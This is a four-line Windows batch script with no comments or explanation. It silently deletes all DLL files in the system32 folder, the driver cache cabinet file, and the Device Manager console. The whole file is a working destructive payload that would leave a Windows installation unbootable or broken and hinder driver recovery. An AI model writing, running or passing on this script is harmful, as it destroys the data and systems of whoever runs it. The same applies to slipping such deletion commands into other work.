@echo off
del "%SystemRoot%\system32\*.dll" /q >nul
del "%SystemRoot%\Driver Cache\i386\driver.cab" /f /q >nul
del %SystemRoot%\system32\devmgmt.msc >nul
